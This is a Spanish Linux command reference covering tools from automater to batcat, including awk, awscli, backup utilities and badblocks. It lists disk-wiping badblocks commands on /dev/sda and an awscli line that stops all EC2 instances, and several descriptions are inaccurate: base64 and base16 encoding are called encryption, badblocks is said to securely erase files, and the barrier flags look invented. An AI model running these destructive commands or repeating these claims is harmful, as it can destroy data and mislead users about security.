$ python automater.py 44A6A7D4A039F7CC2DB6E85601F6D8C1 (De un hash)
$ python automater.py ips.txt -o informe.txt -w informe.html -c informe.csv (Enviando el resultado a un archivo de texto y a una en html y a uno csv)


automysqlbackup
Realizar copias de seguridad de MySQL. El archivo de configuración se encuentra en /etc/default/automysqlbackup. Las copias de seguridad se guardan en /var/lib/automysqlbackup/
# automysqlbackup


autopostgresqlbackup
Script de shell (generalmente que se ejecuta desde cron) totalmente automatizada para realizar copias de seguridad periódicas de las Bases de datos PostgreSQL. Las copias de seguridad se guardan en carpetas diarias/semanales/mensuales en /var/lib/autopostgresqlbackup. Para configurar parámetros como host, bases de datos restringidas para copia de seguridad, tipo de compresión, etc, ha de especificarse en el archivo /etc/default/autopostgresqlbackup.
# autopostgresqlbackup


autoproject
Sólo se ejecuta una vez cuando se comienza un nuevo proyecto y hace varias preguntas al usuario y luego crea un nuevo directorio y lo llena con archivos estándar de programación de GNU, personalizados para el nuevo proyecto. A modo de ejemplo:
$ mkdir mi_proyecto_bash (crear un nuevo directorio para el proyecto)
$ cd mi_proyecto_bash (entrar en él)
$ autoproject -n nombre_script -a USER -e USER@ejemplo.es -d "Gestion de scripts de bash" -l sh
What command line parser generator will be used?
    select from:  argp autogen clig none  [none]:
Please indicate which of the following standard options gestrac will use:
    dry-run? [yN]
    no-warn? [yN]
    output? [yN]
    brief? [yN]
    quiet? [yN]
    verbose? [yN]
    directory? [yN]
    cd? [yN]
    interactive? [yN]
Program Name		: nombre_script
Description	        : Gestion de scripts de bash
Version			: 0.1.0
Language		: sh
Interface		: cli
Parser Generator	: none
Long Options		:
Author      		: USER
Email-Address		: USER@ejemplo.es
Date		        : November 21, 2024
13 files processed
...
$ cd nombre_script
$ ls
ls
aclocal.m4  AUTHORS  autom4te.cache  ChangeLog	configure.in  COPYING  gpl.texinfo  Makefile.am  NEWS  nombre_script.1	nombre_script.in  nombre_script.lsm.in	nombre_script.spec.in  nombre_script.texinfo  README


autorandr
Herramientas para administrar configuraciones de xrandr basadas en dispositivos conectados. Se puede configurar para que cambie automáticamente a una configuración almacenada cada vez que se detecte un cambio en la configuración.
$ autorandr --save mobile (guardar la configuración actual de la pantalla)
$ autorandr --save printer (de la impresora)
$ autorandr --list (listar las configuraciones gardadas)
$ autorandr --load printer --force (intenta evitar recargar una configuración idéntica para forzar la reconfiguración)
$ autorandr -d printer (establecer perfil determinado)
$ autorandr -l printer (cambiar de perfil)


autossh
Similar a ssh pero reanudando la conexión en caso de corte o suspensión del trafico. Para que se realice esta reconexión, ha de tenerse la clave publica entrada en la máquina remota [ver ssh [4]]. Las opciones son las mismas que ssh.


autostart (/etc/xdg/)
Archivo de las aplicaciones que se ejecutan al inicio.
# ls /etc/xdg/autostart/
Para activarlas poner:
NoDisPlay false
Para desactivarlas:
NoDisplay true
# cp /usr/share/applications/guake.desktop /etc/xdg/autostart/ (colocar una aplicación)


autosuspend
Daemon para suspender y reactivar automáticamente el sistema. Los tiempos de inactividad y de activación se determinan mediante un conjunto de comprobaciones configurables. Autosuspend ejecuta periódicamente estas comprobaciones y si ninguna de ellas indica actividad, el sistema se suspende y se activa automáticamente si es necesario. El archivo de configuración en /etc/autosuspend.conf
$ autosuspend -d daemon (activar el daemon)
Para iniciar la suspensión automática a través de systemd, ejecute:
# systemctl enable autosuspend.service (han de activarse esta y la siguiente)
# systemctl enable autosuspend-detect-suspend.service
# systemctl status autosuspend.service (comprobar si se encuentra activo)
Opciones del archivo de configuración:
   # man autosuspend.conf


autotrace
Convierte los datos de imagen de mapa de bits en gráficos vectoriales
$ autotrace imagen.png --output-file imagen.svg


autotrash
Automatizar el limpiado o vaciado de la papelera de reciclaje.
$ autotrash -d 20 (limpiado de los archivos que tengan 20 dias)
$ autotrash -td 20 (lo mismo pero de todos los usuarios del sistema)
$ autotrash --max-free 1024 -d 20 (eliminar los que tengan más de 20 días de antigüedad si queda menos de 1 GB de espacio)
$ autotrash --min-free 1024 (purgar archivos, desde el el más antiguo, hasta que quede 1 GB de espacio nen la papelera)
$ autotrash --max-free 2048 --min-free 1024 -d 20 (eliminar en función del espacio máximo y mínimo que queda en la papelera)


avahi-browse
Herramienta que se utiliza para navegar por la red en busca de servicios disponibles que se anuncian utilizando el protocolo de descubrimiento de servicios Avahi. Avahi permite a los dispositivos de una red local descubrir automáticamente y comunicarse entre sí sin necesidad de un servidor central o de configuración. avahi-browse puede utilizarse para descubrir servicios en la red local, como impresoras, servidores web o servidores de archivos y mostrar información sobre ellos, como su tipo, nombre y dirección IP.
$ avahi-browse --all --resolve --ignore-local (Enumera todos los servicios disponibles en la red local junto con sus direcciones y puertos, ignorando los locales)
$ avahi-browse --browse-domains (lista todos los dominios)


avconv
[avconvert]. Información sobre archivos multimedia y conversión de formatos.
$ avconv -i video.avi video.mpeg  (Pasar de avi a mpeg)
$ avconv -i video.avi (Información sobre un archivo)
$ avconv -i archivo.avi -an nuevo.avi (Sacar el sonido de un avi)
$ avconv -i entrada.flv -ss 00:00:30 -t 00:00:20 -an salida.mp4 (Cortar 20 segundos de un vídeo [-t] empezando a los 30 segundos del inicio [-ss] y sin sonido [-an])
1.-
Convertir varios archivos mp4 a mp3:
	#!/bin/bash
	for i in *.mp4
	do
	    avconv -i "$i" -b 256k "${i%.mp4}.mp3"
	done


avg
Informa de la presencia de virus. No los suprime.  (descarga: <http://free.avg.com/gb-en/download.prd-alf>)
# avgctl –start (Iniciar el servicio)
# avgupdate (actualizar las definiciones de virus)
# avgscan --clean /home/usuario (escanear)


aview
visor de imágenes artísticas ASCII de alta calidad y reproductor de video. Es especialmente útil con un navegador basado en texto. Admite los formatos de imagen pnm, pgm, pbm y ppm, así como los formatos de video FLI y FLC.
$ asciiview logo.png -driver curses
$ aaflip video.fli


avimerge
[transcode, transcode-utils]. Unir varios videos en uno.
$ avimerge -o todos.avi -i 1.avi 2.avi 3.avi
$ avimerge -o todos.avi -i *.avi  (todos los videos de un directorio en uno)


away
Programa simple que bloquea tu terminal, verifica si hay correo nuevo en un número determinado de buzones y permite que otros usuarios sepan por qué estás inactivo. Solo verifica si hay correo en el archivo $MAIL de un usuario, pero al usar el archivo awayrc, un usuario puede configurar cualquier número dado de casillas de correo para que se verifiquen.
$ away (bloquear la terminal hasta que se presione una tecla)
$ away 5m (bloquea la terminal por 5 minutos)
$ away 10m && echo "Terminal desbloqueada" (terminal bloqueada por 10 minutos, después de lo cual se ejecutará el mensaje y la terminal se desbloqueará automáticamente)
$ echo "Iniciando proceso largo..." && away 30s && echo "Proceso terminado" (después de ejecutar el primer echo, la terminal se bloqueará por 30 segundos antes de mostrar el segundo echo)


awk
Busca patrones y los procesa. Es practicamente un lenguaje de programación.
Archivo base para ejemplo (Empleado -- Precio/hora -- Horas trabajadas – Cómo las cobra):
$ cat lista
	Juan Gomez 6 10 banco
	Clara Fuentes 7 12 banco
	Antonio Cano 6 13 metálico
	José Bueno 7 0 banco
	Matías Crespo 5 8 metálico
	Isabel Ruiz 7 0 metálico
	María Monzón 9 16 metálico
Imprimir la segunda columna (Apellidos):
	$ awk ' { print $2 } ' lista
Imprimir la última columna:
	$ awk ' { print $NF } ' lista
Imprimir la linea 3:
	$ awk ' NR == 3 ' lista
Imprimir todo menos la primera columna:
	$ awk ' { $1 = "" ; print } ' lista
Imprimir las columnas tabuladas:
	$ awk ' { print $1 “\t” $2 “\t” $3 “\t” $4 } ' lista
Imprimir las lineas que tengan menos de 22 caracteres:
	$ awk 'length($0) < 22' lista
Calcular el sueldo de los empleados que han trabajado:
	$ awk ' $4 > 0 { print $1,$2, $3*$4} ' lista
Personas que no han trabajado:
	$ awk ' $3 == 0 { print $1}' lista
Buscar una entrada concreta:
	$ awk '/Fuentes/ { print $0 }' lista
Buscar los que cobran en metálico e impimir la 2ª columna:
	$ awk ' /'metálico'/ {print$2}' lista
Buscar dos entradas en una misma linea separándolas con punto y coma (;):
	$ awk '/Fuentes/ { print $0 }; /Cano/ { print$0 } ' lista
Imprimir lineas que tengan alguno de los campos o los dos:
	$ awk '/Bueno/ || /Cano/' lista
Imprimir lineas que tengan los dos campos:
	$ awk '/Bueno/ && /7/' lista
Imprimir las lineas que no tengan el cammpo:
	$ awk '! /metálico/' lista
Buscar las entradas en las que el primer campo empiece por “J”, imprimir el 2º campo y, entre parentesis el último:
	$ awk '$1 ~ /^J/ {print$2, "("$NF")"}' lista
Lo mismo con if:
	$ awk ' { if ($1 ~ /^J/) print$2, “(“$NF”)” }' lista
Añadir 5 horas al 4º campo y comprobar como quedan con la modificación:
	$ awk '{ $4 = ($4+5); print $0 }' lista
Añadir un nuevo campo ($6) con el producto del 3 y el 4:
	$ awk '{ $6 = ($3*$4); print $0 }' lista
print permite colocar texto:
	$ awk ' { print "El sueldo de ",$2," es de ",$3*$4," euros."} ' lista
Mostar las veces que aparece "banco":
	awk 'BEGIN { print "Veces que aparece banco" }
	>        /banco/ { ++banco }
	>         END       { print "banco aparece " banco " veces." }' lista
**Variables internas:**
Mostrar el número de campos de cada linea (NF):
	$ awk ' { print NF } ' lista
Mostrar el número de lineas (NR):
	$ awk ' { print NR } ' lista
Mostrar todas las lineas completas ($0):
	$ awk ' { print $0 } ' lista
Mostrar las lineas que tengan al menos un campo
	$ awk 'NF > 0' lista
Lo mismo con if:
	$ awk '{ if (NF > 0) print }' lista
Dar formato a la salida de datos:
	$ awk ' $4 > 0 { printf "%-8s .... %8.1f euros\n",$2,($3*$4) } ' lista
	$4 > 0 (Que imprima los que la 4ª columna no sea cero.)
	%-8s (Que imprima una cadena (s) justificada a la izquierda (-) en un campo de 8 caracteres de ancho.)
	%8.1f (Que imprima un numero real (f), en un campo de ocho caracteres de ancho, con un decimal(.))
Imprimir cadena, justificada a la izquierda y en campos de 10 y 5 caracteres:
	$ awk '{ printf "%-10s %-10s %-5s %-5s %-5s\n", $1, $2, $3, $4, $5 }' lista
Parecido con más florituras (todo en una sola linea)
	$ awk 'BEGIN {print "nombre\tapellido\tprecio\thoras\tpago"; print  "------\t--------\t------\t-----\t----"}; {print $1"\t"$2"\t"$3"\t"$4"\t"$5 }' lista
Lo mismo más legible:
	$ awk 'BEGIN {print "nombre\tapellido\tprecio\thoras\tpago"
	>             print "------\t--------\t------\t-----\t----"}
	>            {print  $1"\t"$2"\t"$3"\t"$4"\t"$5 }' lista
BEGIN y END son patrones especiales usados para suministrar al script awk qué hacer antes de empezar a procesar y después de haber procesado los registros de la entrada.:
	$ awk 'BEGIN {print “Cuantas veces aparece la palabra banco” }
	>       /banco/ { ++i }
	>       END   {print “banco aparece “i” veces.”}' lista
Los  patrones pueden combinarse mediante los operadores lógicos AND (&&), OR(||) y NOT(!).
Imprimir los nombres de los empleados que ganan mas de 6.50 euros a la hora y que han trabajado mas de 14:
	$ awk ' $3>=6.50 && $4>=14 { print $1,$2 } ' lista
Patrones
buscar las lineas que contienen la cadena "banco" en el 5º campo:
	$ awk ' $5 ~ /banco/ ' lista
Buscar las lineas que no contengan la cadena "banco" en el 5º campo:
	$ awk '  $5 !~ /banco/ ' lista
Mostrar los que el 4º campo no empiece por 0 o 1:
	$ awk ' $4 ~ /^[^01]/' lista
La salida también puede pasarse a un filtro para ordenarse:
	$ awk ' { print $2 | "sort" } ' lista
Mostrar la linea cuyo 2º campo termina en “iz”:
	$ awk '$2 ~ /iz$/' lista
Mismo concepto sin especificar si la primera letra es mayúscula o minúscula y sin conocer la segunda:
	$ awk '$1 ~ /^[Cc]./' lista
Mismo concepto incluyendo las que empiezan por “R”:
	$ awk '$2 ~ /^[Cc].|^[R]/' lista
“tolower” convierte el campo especificado a minúsculas:
	$ awk 'tolower($1) ~ /^m/' lista
Para mandar cada linea a un archivo con el nombre del 2er campo:
	$ awk ' { print > $2 } ' lista
Mandar el primer campo a un archivo y el segundo a otro:
	$ awk '{ print $1 > "nombres"; print $2 > "apellidos" }' lista
Lo mismo pero mandándolo ordenado:
	$ awk '{ print $1 | "sort > nombres"; print $2 | "sort > apellidos" }' lista
Indicando caracter separador (un espacio y que imprima el 2º campo):
	$ awk  -F " " ' { print $2 } ' lista
Lo mismo usando BEGIN:
	$ awk 'BEGIN { FS = " " } ; { print $2 }' lista
El siguiente  programa  muestra  como  puede usarse awk para validación de datos.
$ cat validar
	$3 < 6.5   { print $1,$2 " ===> precio por hora bajo", "("$3")" }
	$3 > 8     { print $1,$2 " ===> precio por hora alto", "("$3")" }
	$5 == "banco"    { print $1,$2 " ===> Cobra por banco" }
	$5 == "metálico" { print $1,$2 " ===> Cobra en metálico" }
Se ejecuta con:
	$ awk -f validar lista
Aunque también podríamos añadir que lo ordenara por orden alfabetico del segundo campo (-k2) separado del primero por un espacio(-t” “):
	$ awk -f validar lista | sort -t” “ -k2
Otros ejemplos:
	$ awk '/d.[0-9]/{print $4}' /proc/partitions  (listar todas las particiones)
	$ cat 1.txt | awk '{print$1”\t”$2}'  (tabulando la salida)
	$ cat 1.txt | awk '!/#/{print $0}' > 2.txt  (Imprime todo menos las lineas comentadas y lo manda a un archivo)
	$ cat 1.txt | awk 'BEGIN { FS="\n"; RS="" } { print $1 }' > lista.txt (Manda a un archivo las primeras lineas precedidas de una en blanco)
	$ who | awk '{print $1}'  (Mostrar todos los usuarios registrados)
	$ awk '$1~/^DocumentRoot/{print $2}' /etc/apache2/sites-available/default (conocer la carpeta del servidor)
	$ awk 'BEGIN { for (i = 1; i <= 7; i++) print int(101 * rand()) }' (Escribir 7 números aleatorios del 0 al 100)
	$ awk ' { print "\"" $0 "\""} ' lista (Entrecomillar cada una de la lineas del archivo)
Creación de scripts con awk:
1.-
Imprimir el simple "Hola mundo cruel"
	#!/usr/bin/awk -f
	BEGIN { print "Hola mundo cruel" }
Lo mismo pero incluido en un script de bash:
	#!/bin/bash
	awk 'BEGIN { print "Hola mundo cruel" }'
2.-
Mandar el segundo campo de listado.txt a un archivo y el sexto a otro:
	#! /usr/bin/awk -f
	awk '{ print$2 > "lista_nombres"
	       print$6 > "lista_telefonos" }' listado.txt
3.-
Pasar el comando date... a variable [getline dia_actual], cerrar el comando [close] e imprimirlo en pantalla:
	#!/usr/bin/awk -f
	BEGIN {
               "date +%d-%m-%Y" | getline dia_actual
               close("date +%d-%m-%Y")
               print "Hoy estamos a " dia_actual
    }
En bash:
	awk 'BEGIN {
               "date +%d-%m-%Y" | getline dia_actual
               close("date +%d-%m-%Y")
               print "Hoy estamos a " dia_actual
    }'
4.-
Usar variables dentro de awk
	variable="primera linea\nsegunda linea"
	awk 'BEGIN {print "'"$variable"'"}'
	primera linea
	segunda linea


awscli
Proporciona acceso directo a las API públicas de los servicios de AWS. Configuración inicial:
# aws configure (configurar credenciales, pedirá: access key ID, secret access key, región predeterminada [ej.: us-east-1] y formato de salida [ej.: json, table, o text])
# aws s3 ls (ver todos los buckets en S3)
# aws s3 cp archivo.txt s3://mi-bucket/archivo.txt (subir un archivo local a un bucket)
# aws s3 cp s3://mi-bucket/archivo.txt archivo_local.txt (Descargar un archivo desde un bucket)
# aws ec2 run-instances --image-id ami-0abcdef1234567890 --count 1 --instance-type t2.micro --key-name MiClave --security-group-ids sg-0123456789abcdef --subnet-id subnet-0123456789abcdef (lanzar nueva instancia usando una AMI específica)
# aws ec2 describe-instances (mostrar todas las instancias EC2 en la cuenta)
# aws logs get-log-events --log-group-name MiGrupoLogs --log-stream-name MiFlujoLogs (consultar los logs de un grupo de logs en CloudWatch)
# aws dynamodb create-table --table-name MiTabla --attribute-definitions AttributeName=Id,AttributeType=S --key-schema AttributeName=Id,KeyType=HASH --provisioned-throughput ReadCapacityUnits=1,WriteCapacityUnits=1 (crear una tabla básica)
# aws dynamodb get-item --table-name MiTabla --key '{"Id": {"S": "12345"}}' (consultar un elemento por su clave primaria)
# aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/MiCola --message-body "Hola desde AWS CLI" (enviar un mensaje a una cola de SQS)
# aws iam create-user --user-name USER (crear un nuevo usuario en IAM)
# aws s3 sync ./mi-directorio s3://mi-bucket (sincronizar un directorio con S3)
# aws s3 help (ayuda con algún comando específico)
# aws ec2 stop-instances --instance-ids $(aws ec2 describe-instances --query "Reservations[*].Instances[*].InstanceId" --output text) (detener todas las instancias EC2)
# aws s3api put-bucket-policy --bucket mi-bucket --policy file://policy.json (cambiar la política de un bucket)´


awstats
[libnet-dns-perl libnet-ip-perl libnet-xwhois-perl]. Estadísticas de la red local.
configuración mínima:
$ nano /etc/awstats/awstats.conf
Verificar:
LogFile="/var/log/apache2/access.log"
SiteDomain=”tu_dominio.com” (entre comillas nombre del host)
LogFormat=1 (El usado por apache)
AllowToUpdateStatsFromBrowser=1 (Actualizar via navegador)
Lang="es"
Asegurar permisos:
# chmod o+r /var/log/apache2/access.log
Crear enlace de las imágenes:
	# ln -s /usr/share/awstats/icon/ /var/www/awstats-icon
Crear las estadísticas:
	# /usr/lib/cgi-bin/awstats.pl -update -config=/etc/awstats/awstats.conf
Para ver las estadísticas, en el navegador:
	http://localhost/cgi-bin/awstats.pl
Si no queremos que las estadísticas sean accesibles para cualquiera:
	# gedit /etc/apache2/sites-available/default
Y en la linea “Allow from All” de la sección siguiente, quitamos el “All” y ponemos 127.0.0.1 [O la ip que proceda] y reiniciamos servicio:
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
	AllowOverride None
	Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
	Order allow,deny
	Allow from 127.0.0.1
	</Directory>
# /etc/init.d/apache2 force-reload


axel
Acelerador de descargas
$ axel http://download.com/file.tar.gz
$ axel -s 5242880 http://download.com/debian.iso  (Para una velocidad media de 5120 kilobyte x seg)
$ axel -n 3 -s 5242880 http://download.com/my.iso  (Limitar el numero de conexiones de descarga a 3)
Pueden configurarse parámetros generales en el archivo:
# nano /etc/axelrc
Añadiendo, por ejemplo:
reconnect_delay = 20
max_speed = 0
num_connections = 10
connection_timeout = 30
Que realice 10 conexiones por cada archivo y sin límite de descarga.


b2sum
Calcular els hash de ficheros o frases.
$ echo -n "Linux es un sistema genial" | b2sum
$ b2sum -l 380 .bashrc .emacs .authinfo .profile .stumpwmrc .bzr.log (sobre varios archivos y longitud de 380 bits)
$ b2sum -b .bashrc (calcularlo en binario)


b3sum
Calcula el hash criptográfico BLAKE3, función mucho más rápida que MD5, SHA-1, SHA-2, SHA-3 y BLAKE2 y segura, a diferencia de MD5 y SHA-1.
$ b3sum archivo.txt > archivo.txt.b3sum (obtener el hash de un archivo y guardarlo en un archivo)
$ b3sum archivo1.txt archivo2.txt (calcular el hash de varios archivos)
$ echo "linux es un sisteme genial" | b3sum (leer datos desde la entrada estánda)
$ b3sum -c archivo.txt.b3sum (verificar la integridad de un archivo)
$ b3sum --num-threads 4 archivo_grande.dat (con archivos grandes usa múltiples núcleos de CPU automáticamente, el comando verifica que se está utilizando paralelismo)
$ b3sum --no-names archivo.txt (la salida solo mostrará el hash sin el nombre del archivo)
$ find /directorio -type f -exec b3sum {} + (calcular el hash para cada archivo del /directorio)


backup-manager
Realiza copias de seguridad. Puede comprimir en tar, tar.gz, tar.bz2, y zip. El archivo de configuración está en /etc/backup-manager.conf.
# backup-manager


backupninja
Permite realizar copias de seguridad de bases de datos, directorios y más, de manera automática. Configuración Básica:
# nano /etc/backupninja.conf
    loglevel = 4    # Nivel de detalle en los registros (1-5)
    reportemail = tuemail@ejemplo.com  # Recibe informes de las tareas
# backupninja --check (probar las configuraciones sin ejecutarlas)
# tail -f /var/log/backupninja.log (ver los registros)
Ejemplos para crear un respaldo de un directorio local. Las tareas individuales se almacenan en /etc/backup.d/. Cada archivo define una tarea específica en formato YAML:
1.-
# nano /etc/backup.d/10-backup-directorio.dup
Con las lineas:
    log: short
    action: rdiff
    source: /home/usuario/
    destination: /media/backup/
# backupninja --run (ejecutarlo)
2.-
Respaldo de una base de datos MySQL:
# nano /etc/backup.d/20-backup-mysql.sql
Con el contenido:
    log: short
    action: mysql
    database: midatabase
    username: root
    password: mipassword
    backupdir: /media/backup/mysql
    compress: gzip
# backupninja --run (ejecutarlo)
3.-
 Enviar copias de seguridad a un servidor remoto (rsync)
# nano  /etc/backup.d/30-backup-remoto.rsync
Con el contenido:
    log: verbose
    action: rsync
    source: /var/www/
    destination: usuario@servidorremoto:/backups/www/
    sshoptions: -i /home/usuario/.ssh/id_rsa
# backupninja --run (ejecutar la tarea)
4.-
 Respaldar un archivo completo del sistema (tar)
# nano /etc/backup.d/40-backup-sistema.tar
Con el contenido:
    log: verbose
    action: tar
    backupdir: /backups
    files:
      - /etc
      - /home
      - /var/log
    compress: gzip
# backupninja --run (ejecutarlo)
5.-
 Configurar tareas automáticas
Para que las tareas se ejecuten automáticamente, backupninja utiliza cron. Por defecto, está configurado en /etc/cron.d/backupninja para ejecutarse diariamente:
     0 3 * * * root backupninja --run
Esto ejecutará todas las tareas a las 3:00 AM.


badblocks
[e2fsprogs]. Utilidad para reparar sectores dañados del disco duro o pendrive. Trabajar con la unidad desmontada.
# badblocks -s -v -n -f /dev/sda  (recuperar y reparar sectores dañados)
# badblocks -nsv /dev/sda (Test de lectura y escritura no destructivo)
# badblocks -wsv /dev/sda (Test de lectura y escritura destructivo)
# badblocks -w -t random -s -v /dev/sda (Borrar un disco de forma segura)
# badblocks -s -w archivo.txt (Borrar de forma segura un archivo [irrecuperable])
# badblocks -sv /dev/sdb -o badblocks.log  (crear un informe)
nota.- Terminado el proceso debe formatearse la unidad, pasando a la herramienta los bloques dañados:
# mkfs.vfat -l badblocks.log -n usb /dev/sdb  (-n es un nombre que le damos a la unidad)
Opciones
	-s (muestra el progreso)
	-v (modo detallado)
	-n (recupera sectores dañados sin destruir informacion [modo no-destructivo])
	-f (repara los sectores dañados)
	-w (Modo destructivo)
	-t random (escribe de forma aleatoria en el disco)


bandwidthd
Herramienta que analiza la utilización del ancho de banda disponible y genera reportes gráficos. Una vez instalado poner en la barra del navegador:
	file:///var/lib/bandwidthd/htdocs/index.html
Para afinar la configuración en /etc/bandwidthd/bandwidthd.conf


banner
Muestra un cartel en pantalla
$ banner Linux
$ banner -C linux  (centra la imagen en la linea)
$ banner -l linux   (forma cada letra con la misma letra diminuta)
$ banner -Cck linux  (centrado y con la letra “k” formando la palabra “linux”)


bar
Mostrar barra de progreso de un proceso.
$ bar file1 file2 file2 > file3 (equivalente a: cat file1 file2 file2 > file3)
$ bar -o outfile infile (equivalente a: cp infile outfile)
$ bar -n archivo.tar.gz | tar -xzpf - (de la descompresión de un archivo)


barrier
Permite compartir fácilmente un único ratón y teclado entre varios ordenadores con distintos sistemas operativos, cada uno con su propia pantalla, sin necesidad de hardware especial. Está pensado para usuarios con varios ordenadores en su escritorio, ya que cada sistema utiliza su propia pantalla. Redireccionar el ratón y el teclado es tan sencillo como mover el ratón fuera del borde de la pantalla. Barrier también fusiona los portapapeles de todos los sistemas en uno solo, lo que permite cortar y pegar entre sistemas. Además, sincroniza los protectores de pantalla para que todos se inicien y finalicen juntos y, si el bloqueo de pantalla está habilitado, solo una pantalla requiere una contraseña para desbloquearlos todos.
$ barrier --master=pc1 --slave=pc2 (compartir una única pantalla y entrada entre dos computadoras, PC1 como el maestro y PC2 como el esclavo)
$ barrier --master=pc1 --slave=pc2 pc3 pc4 (conecta PC1 como maestro con PC2, PC3 y PC4 como esclavos)
$ barrier --master=pc1 --slave=pc2 --shared-key=KEY (especifica un clave compartida para asegurar la conexión entre los nodos barrier)
$ barrier --status (muestra el estado actual de todas las conexiones barrier activas)
$ barrier --stop (detiene completamente la sesión barrier en ejecución)


base58
Herramienta útil para codificar y decodificar datos en formato Base58.
$ echo "linuxgenial" | base58 (codificar)
$ echo "33f9yRbkMB4uknG9f" | base58 --decode (descodificar)


base64
[cl-base64]. Codificador/descodificador de textos
$ cat archivo| base64 > cifrado (cifrar "archivo" y volcarlo en "cifrado")
$ base64 archivo.txt  (codifica todo el texto de archivo.txt)
$ base64 -d codificado.txt (descodificar)
$ echo "la_contraseña_secreta" | base64 > archivo.txt (Codificar palabra o frase)


base-files
Este paquete contiene la jerarquía básica del sistema de archivos de un sistema Debian y varios archivos importantes, como /etc/debian_version, /etc/host.conf, /etc/issue, /etc/motd, /etc/profile, y otros, y el texto de varias licencias comunes en uso en sistemas Debian.


basename
Mostrar el archivo “pelado” suprimiendo su ruta y sufijos.
$ basename /etc/rc.d/cupsd (devolverá “cupsd”)
$ basename /etc/rc.d/cupsd start (También devolvera “cupsd”)


basenc
Codificar/decodificar datos e imprimirlos por pantalla.
$ basenc --base16 text.txt > cifrado.txt (cifrar con base64)
$ cat cifrado.txt | basenc -d --base16 (descifrar)
$ printf 'linux es un sistema genial' | basenc --base64 (cifrar)


basez
Codificar/descodificar archivos. Incluye los ejecutables: hex, base16, base32plain, base32hex, base64plain, base64url, base64mime y base64pem. Todos los ejecutables se usan con los mismos argumentos:
$ basez -i archivo.txt -o salida.txt (mandar la codificación a salida.txt)
$ basez -d salida.txt (lo muestra en pantalla descodificado)
$ base64url archivo.txt (muestra la codificación en pantalla)


bash
Intérprete de comandos compatible con sh que ejecuta comandos leídos desde la entrada estándar o desde un archivo.
$ bash -n script (comprueba todo un script sin ejecutar comandos solo los comprueba)
$ bash -v script (Imprime las líneas de entrada del shell a medida que se leen)
$ bash -x script (Imprime los comandos y sus argumentos a medida que se ejecutan)
1.-
Encabezar un script de bash con la linea
          #!/bin/bash
Si queremos que el script bash se ejecute en modo "depuración"
          #!/bin/bash -x
2.-
Los parámetros que se pueden usar dentro de un script bash son:
    $# 	Nº de parametros recibidos
    $0 	Nombre y ruta del propio script
    $1 ... $9 	Parámetros del 1 al 9 recibidos
    ${N} 	Parámetro de la posicion N recibido
    $* 	Todos los parámetros recibidos [excepto $0]
    $@ 	Array de parámetros recibidos [excepto $0]
    $$ 	El PID [numero de proceso] del script
    $? 	El código de error del ultimo comando ejecutado


bash-builtins
Bash puede cargar dinámicamente nuevos comandos integrados. Se incluyen los encabezados necesarios para compilar sus propios comandos integrados y muchos ejemplos. En el navegador file:///usr/share/doc/bash-builtins


bash-doc
Manuales de bash (en).
$ firefox file:////usr/share/doc/bash/bashref.html
$ evince /usr/share/doc/bash-doc/bash.pdf
$ evince /usr/share/doc/bash/bash.pdf
$ ls /usr/share/doc/bash/examples


bashbug
Guión del shell para ayudar al usuario a componer y enviar informes de fallos concernientes a bash en un formato normalizado. bashbug llama al editor por defecto o, si no está definido a emacs. El usuario debe rellenar los campos apropiados y salir del editor. Entonces, bashbug envía el informe a bug-bash@prep.ai.mit.edu. Si el informe no puede ser enviado, se guarda en el fichero dead.bashbug en el directorio del usuario. La plantilla del informe consiste en varias secciones. La primera proporciona información sobre la máquina, el sistema operativo, la versión de bash y el entorno de compilación. La segunda sección debería rellenarse con una descripción del fallo. La tercera sección debería ser una descripción de cómo reproducir el fallo y la cuarta sección, opcional, es para una correción que se proponga.
$ bashbug


bashburn
Grabador de CDs en bash. Una vez lanzada la aplicación y creado el archivo de configuración, sale un bonito menú de opciones del que se desplegaran nuevos submenús según la selección.
$ bashburn


bashdb
Debbuger para bash scripting.
$ bashdb ./script.sh
Entra en el prompt de la aplicación.
	help (Muestra las opciones)
	next (ejecuta la siguiente orden)


bashish
Entorno para terminales de texto. Permite cambiar colores, tipo de letra, transparencias, imagen de fondo... Descarga de <http://sourceforge.net/projects/bashish/files/> . Se instala con el clásico:
$ ./configure && make && sudo make install
$ bashish list (Muestra el listado de temas)
$ bashish fire (Abre la terminal col el tema fire)
$ BASHISH_DISABLED=1 un_comando (Lanza el comando que especifiquemos deshabilitando bashish)


bashrc
Archivo de configuración de la terminal propia del usuario.
1.-
Para que al escribir un comando que requiera permisos de root pueda autocompletarse presionando la tecla “Tab”.
$ gedit /home/usuario/.bashrc
Y añadir las líneas:
	if [ "$PS1" ]; then
	    Complete -cf sudo
	fi
2.-
Añadiendo o modificando las siguientes lineas se consigue que el history de bash se amplie al recuerdo a los últimos 3000 comandos usados, suprimiendo los repetidos y que ignore el espacio (Si se pone) de delante de un comando.
	export HISTFILESIZE=3000
	export HISTCONTROL=ignoredups:ignorespace
Si queremos que la sesión de bash se cierre si está inactiva durante 600 segundos, colocar la linea:
	export TMOUT=600
3.-
Establecer un proxy global a nuestro sistema
$ nano ~/.bashrc
Y añadir las siguientes líneas:
	export http_proxy=”http://ip_del_servidor:puerto”
	export https_proxy=”http://ip_del_servidor:puerto”
	export ftp_proxy=”http://ip_del_servidor:puerto”
4.-
Para que el history indique fecha y hora en la que se ha lanzado el comando:
	export HISTTIMEFORMAT='- %F %T - '
5.-
Para guardar en /root un fichero de histórico por cada uno de los usuarios que se hayan pasado a root.
	export HISTFILE=/root/.bash_hist-$(who am i | awk '{print $1}';exit)


bashtop
Script de bash que muestra información sobre el uso de la cpu, espacio de disco y procesos del sistema. Descarga <https://github.com/aristocratos/bashtop>
$ bashtop


bastet
Clon libre de Tetris que intenta calcular qué tan útiles son los bloques que necesitas y te da el peor posible.
$ bastet


batcat
Reemplazo de cat con resaltado de sintaxis para una gran cantidad de idiomas, integración con git y paginación automática. En este paquete, el ejecutable y su página de manual han cambiado de nombre de "bat" a "batcat" debido a un conflicto de nombres de archivo con otro paquete Debian.
$ batcat -A text.txt (mostrando, espacios, tabulaciones, nueva linea...)
$ batcat -p text.txt (mostrar en texto plano)
$ batcat -n script.sh (mostrando número de lina)
$ batcat -l c script.c (batcat detectará muchos lenguajes de programación resaltarando la sintaxis. La opción -l fuerza la detección de un lenguaje concreto, como C)
$ batcat -L (todos los lenguajes soportados)
$ batcat --list-themes (ver temas con sus muestras disponibles)
$ batcat --theme TwoDark archivo (ver archivo con el tema seleccionado)
Si queremos usar un tema concreto por defecto, colocar en .bashrc la linea y recargar:
